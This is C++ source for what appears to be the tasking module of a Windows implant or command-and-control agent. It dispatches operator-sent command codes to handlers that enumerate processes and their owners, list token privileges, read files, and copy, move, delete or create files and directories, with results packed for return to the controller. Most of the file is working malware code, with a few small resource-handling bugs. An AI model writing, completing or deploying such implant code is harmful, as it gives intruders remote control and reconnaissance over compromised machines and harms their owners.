#include "cmds.hpp"
#include <stdio.h>


/*
	todo
		cleanup do_ls and do_getprivs, also make output prettier
*/

enum CMD_ACTION_CODES {
	CMD_CODE_PS,
	CMD_CODE_CMD,
	CMD_CODE_CAT,
	CMD_CODE_LS,
	CMD_CODE_RM,
	CMD_CODE_MV,
	CMD_CODE_PWD,
	CMD_CODE_CD,
	CMD_CODE_CP,
	CMD_CODE_RMDIR,
	CMD_CODE_GETPRIVS,
	CMD_CODE_MKDIR,
};



BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
	g_ByteMgr->InitRead(Data, size);
	g_ByteMgr->Write4(MSG_TYPE_OUTPUT);
	UINT TotalCommands = g_ByteMgr->Read4();
	g_ByteMgr->Write4(TotalCommands);
	for (INT i = 0; i < TotalCommands; i++) {
		UINT CmdCode = g_ByteMgr->Read4();
		switch (CmdCode)
		{
		case CMD_CODE_PS:
			do_ps();
			break;
		case CMD_CODE_LS:
			do_ls();
			break;
		case CMD_CODE_MV:
			do_mv();
			break;

		case CMD_CODE_PWD:
			do_pwd();
			break;

		case CMD_CODE_CD:
			do_cd();
			break;

		case CMD_CODE_CAT:
			do_cat();
			break;

		case CMD_CODE_CP:
			do_cp();
			break;

		case CMD_CODE_RMDIR:
			do_rmdir();
			break;
		case CMD_CODE_MKDIR:
			do_mkdir();
			break;

		case CMD_CODE_RM:
			do_rm();
			break;

		case CMD_CODE_GETPRIVS:
			do_getprivs();
			break;
		default:
			break;
		}

	}

	return TRUE;
}



void commanders::do_getprivs() {
	PTOKEN_PRIVILEGES TokenPrivs = NULL;
	PCHAR buf					 = NULL;
	HANDLE hToken				 = NULL;

	ULONG size      = 0;
	NTSTATUS Stat   = 0;
	DWORD StatusLen = 0;
	DWORD TotalSize = 0;
	DWORD capacity  = 0;
	


	g_ByteMgr->BeginTask();
	
	Stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
		return;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &size);
	TokenPrivs = AllocMemory<TOKEN_PRIVILEGES>(size);
	if (!TokenPrivs) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivs, size, &size);
	if (!NTAPI_SUCCESS(Stat)) {
		g_ByteMgr->EndErr(ERROR_FAILED_TOKENS);
		return;
	}

	
	capacity = TokenPrivs->PrivilegeCount * 300;
	buf = AllocMemory<CHAR>(capacity);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_GETPRIVS);
	g_ByteMgr->Write4(TokenPrivs->PrivilegeCount);
	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
		LUID_AND_ATTRIBUTES Priv = TokenPrivs->Privileges[i];

		CHAR name[256] = { 0 };
		DWORD NameLne = sizeof(name);
		if (!hades->WinApis.LookupPrivilegeNameA(NULL, &Priv.Luid, name, &NameLne)) {
			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
			goto CLEANUP;
		}

		const char* Status;
		if (Priv.Attributes & SE_PRIVILEGE_REMOVED) {
			Status = "Removed"; StatusLen = 7;
		}
		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED) {
			Status = "Enabled"; StatusLen = 7;
		}
		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
			Status = "Enabled by Default"; StatusLen = 18;
		}
		else {
			Status = "Disabled"; StatusLen = 8;
		}
		g_ByteMgr->Write4(NameLne);
		g_ByteMgr->WriteString((PBYTE)name, NameLne);
		g_ByteMgr->Write4(StatusLen);
		g_ByteMgr->WriteString((PBYTE)Status, StatusLen);

	}
	
CLEANUP:
	
	if (TokenPrivs)   { HeapFree(GetProcessHeap(), 0, TokenPrivs); }
	if (buf)          { HeapFree(GetProcessHeap(), 0, buf);        }
	if (hToken)       { hades->WinApis.CloseHandle(hToken);        }
	return;
}



void commanders::do_cat() {
	BOOL Result     = FALSE;
	HANDLE hFile    = NULL;
	PBYTE buf       = NULL;
	DWORD ChunkSize = 2048;
	DWORD BytesRead = 0;
	
	
	g_ByteMgr->BeginTask();

	UINT FileLen = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(FileLen);

	hFile = hades->WinApis.CreateFileA(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	buf = AllocMemory<BYTE>(ChunkSize);
	Result = hades->WinApis.ReadFile(hFile, (PBYTE)buf, ChunkSize, &BytesRead, NULL);
	if (Result) {
		g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, BytesRead, buf);
		goto CLEANUP;
	}
	else {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	if (buf)      { HeapFree(GetProcessHeap(), 0, buf); }
	if (hFile)    { hades->WinApis.CloseHandle(hFile); }
	return;



}




void commanders::do_ls() {
	WIN32_FIND_DATAA FindData;
	HANDLE hFind = NULL;
	
	DWORD typeLen;
	DWORD BufSize   = 12 * 1024;
	DWORD TotalSize = 0;
	DWORD Namelen   = 0;
	DWORD EntryLen  = 0;
	DWORD PathSize  = 0;

	char path[MAX_PATH];
	const char* type;
	g_ByteMgr->BeginTask();

	UINT len = g_ByteMgr->Read4();
	PCHAR Dir = g_ByteMgr->ReadString(len);
	
	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
	path[PathSize] = '\\';
	path[++PathSize] = '*';
	path[++PathSize] = '\0';

	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_TYPE_LS);
	do {
		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
			continue;
		}
		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			type = "DIR"; typeLen = 3;
		}
		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			type = "LINK", typeLen = 4;
		}
		else {
			type = "FILE"; typeLen = 4;
		}

		UINT len = (UINT)strlen(FindData.cFileName);
		g_ByteMgr->Write4(len);
		g_ByteMgr->WriteString((PBYTE)FindData.cFileName, len);
		g_ByteMgr->Write4(typeLen);
		g_ByteMgr->WriteString((PBYTE)type, typeLen);
		

	} while (hades->WinApis.FindNextFileA(hFind, &FindData));

	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (Dir) { g_ByteMgr->FreeString(Dir); }

}

void commanders::do_cp() {
	g_ByteMgr->BeginTask();

	UINT srcLen = g_ByteMgr->Read4();
	PCHAR src   = g_ByteMgr->ReadString(srcLen);
	UINT dstLen = g_ByteMgr->Read4();
	PCHAR dst   = g_ByteMgr->ReadString(dstLen);

	BOOL Result = hades->WinApis.CopyFileA(src, dst, FALSE);
	if (!Result) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(CP_SUCCESS);
CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); }
	if (dst) { g_ByteMgr->FreeString(dst); }
	return;

}


void commanders::do_rmdir() {
	g_ByteMgr->BeginTask();

	UINT DirLen   = g_ByteMgr->Read4();
	PCHAR DirName = g_ByteMgr->ReadString(DirLen);

	if (!hades->WinApis.RemoveDirectoryA(DirName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(RMDIR_SUCCESS);

CLEANUP:
	if (DirName) { g_ByteMgr->FreeString(DirName); }
	return;
}


void commanders::do_mkdir() {
	g_ByteMgr->BeginTask();
	
	DWORD Len = g_ByteMgr->Read4();
	PCHAR Name = g_ByteMgr->ReadString(Len);

	if (!hades->WinApis.CreateDirectoryA(Name, NULL)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(MKDIR_SUCCESS);

CLEANUP:
	if (Name) { g_ByteMgr->FreeString(Name); }
}

void commanders::do_rm() {
	g_ByteMgr->BeginTask();

	UINT NameLen   = g_ByteMgr->Read4();
	PCHAR FileName = g_ByteMgr->ReadString(NameLen);

	if (!hades->WinApis.DeleteFileA(FileName)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(RM_SUCCESS);

CLEANUP:
	if (FileName) { g_ByteMgr->FreeString(FileName); }
	return;
}

void commanders::do_cd() {
	g_ByteMgr->BeginTask();

	UINT DirLen = g_ByteMgr->Read4();
	PCHAR dir   = g_ByteMgr->ReadString(DirLen);
	if (!hades->WinApis.SetCurrentDirectoryA(dir)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}

	g_ByteMgr->EndOk(CD_SUCCESS);
CLEANUP:
	if (dir) { g_ByteMgr->FreeString(dir); }
	return;
}

void commanders::do_pwd() {
	DWORD Res = 0;
	UINT TaskID = g_ByteMgr->BeginTask();

	DWORD size = hades->WinApis.GetCurrentDirectoryA(0, NULL);

	PCHAR buf = AllocMemory<CHAR>(size);
	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}

	Res = hades->WinApis.GetCurrentDirectoryA(size, buf);
	if (Res == 0 || Res >= size) {
	
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}


	g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, Res, (PBYTE)buf);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
	return;

	return;
}

void commanders::do_mv() {
	UINT TaskID = g_ByteMgr->BeginTask();

	UINT srclen = g_ByteMgr->Read4();
	PCHAR src = g_ByteMgr->ReadString(srclen);
	UINT dstlen = g_ByteMgr->Read4();
	PCHAR dest = g_ByteMgr->ReadString(dstlen);

	if (!hades->WinApis.MoveFileA(src, dest)) {
		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
		goto CLEANUP;
	}
	g_ByteMgr->EndOk(MV_SUCCESS);

CLEANUP:
	if (src) { g_ByteMgr->FreeString(src); };
	if (dest) { g_ByteMgr->FreeString(dest); }
	return;

}


//
void commanders::do_ps() {
	NTSTATUS stat;
	ULONG size = 0;
	PSYSTEM_PROCESS_INFORMATION spi = NULL;
	CLIENT_ID cid = { 0 };
	OBJECT_ATTRIBUTES oa;
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;

	PBYTE buf    = NULL;
	PBYTE OutBuf = NULL;

	DWORD capacity = BASE_BUFFER_SIZE;
	DWORD needed = 0;
	DWORD PID = 0;
	INT pidlen = 0;
	INT len = 0;

	const char* owner = "N/A";
	DWORD ownerLen = 3;

	g_ByteMgr->BeginTask();

	hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
	buf = AllocMemory<BYTE>(size);

	if (!buf) {
		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
		goto CLEANUP;
	}
	
	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
	if (!NTAPI_SUCCESS(stat)) {
		g_ByteMgr->EndErr(ERROR_PS_LIST);
		goto CLEANUP;
	}

	spi = (PSYSTEM_PROCESS_INFORMATION)buf;


	g_ByteMgr->Write4(STATUS_OK);
	g_ByteMgr->Write4(TASK_PS_LIST);
	while (TRUE) {
		CHAR line[512] = { 0 };
		DWORD pos = 0;
		if (!spi->ImageName.Buffer) {
			goto NEXT_ENTRY;
		} 
		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;

		cid.UniqueProcess = (HANDLE)(ULONG_PTR)PID;
		cid.UniqueThread = 0;

		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
		stat = hades->NtApis.NtOpenProcess(&hProc, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cid);
		if (NTAPI_SUCCESS(stat)) {
			stat = hades->NtApis.NtOpenProcessToken(hProc, TOKEN_QUERY, &hToken);

			if (NTAPI_SUCCESS(stat)) {
				hades->WinApis.GetTokenInformation(hToken, TokenUser, NULL, 0, &needed);
				PTOKEN_USER tokenUsr = AllocMemory<TOKEN_USER>(needed);

				if (hades->WinApis.GetTokenInformation(hToken, TokenUser, tokenUsr, needed, &needed)) {
					CHAR NameBuf[256];
					CHAR DomainBuf[256];
					DWORD NameLen = 256;
					DWORD DomainLen = 256;

					SID_NAME_USE sidType;
					if (hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
						owner = NameBuf;
						ownerLen = NameLen;
						
					}
				}
				HeapFree(GetProcessHeap(), 0, tokenUsr);
				hades->WinApis.CloseHandle(hToken);
			}
			hades->WinApis.CloseHandle(hProc);
		}
		g_ByteMgr->Write4(len);
		g_ByteMgr->WriteString((PBYTE)line, len);
		g_ByteMgr->Write4(ownerLen);
		g_ByteMgr->WriteString((PBYTE)owner, ownerLen);
		g_ByteMgr->Write4(PID);
		

	NEXT_ENTRY:
		if (spi->NextEntryOffset == NULL) break;
		spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
	}
	g_ByteMgr->Write4(END_SIG);

CLEANUP:
	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }


}



commanders* g_Commander = NULL;